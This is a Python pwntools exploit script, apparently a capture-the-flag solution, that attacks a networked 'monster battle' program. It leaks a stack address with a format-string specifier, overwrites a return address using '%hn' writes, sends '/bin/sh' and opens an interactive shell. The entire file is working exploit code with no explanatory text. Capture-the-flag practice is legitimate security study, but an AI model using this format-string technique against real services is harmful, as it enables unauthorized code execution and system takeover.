from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]
p = connect("172.24.112.1",10825)

def VIO_TEXT(x, code=95):
    return f"\x1b[{code}m{x}\x1b[0m"


def CLEAR_TEXT(x, code=32):
    return f"\x1b[{code}m{x}\x1b[0m"


system = 0x40127B

payload = b'%8$p'
p.sendafter("You start talking to him...\n", payload)
p.recvuntil('0x')
stack_ret = int(p.recv(12), 16) - 0x18
log.success(VIO_TEXT("stack_ret: " + hex(stack_ret)))
p.sendafter("You enraged the monster-prepare for battle!\n", 'a' * 8)

count = stack_ret & 0xffff
payload2 = f'%{count}c%6$hn'.format().encode()
p.sendafter("You start talking to him...\n", payload2)
p.sendafter("You enraged the monster-prepare for battle!\n", 'a' * 8)

count = system & 0xffff
payload3 = f'%{count}c%47$hn'.format().encode()
p.sendafter("You start talking to him...\n", payload3)
p.sendafter("You enraged the monster-prepare for battle!\n", '/bin/sh\x00')

p.interactive()

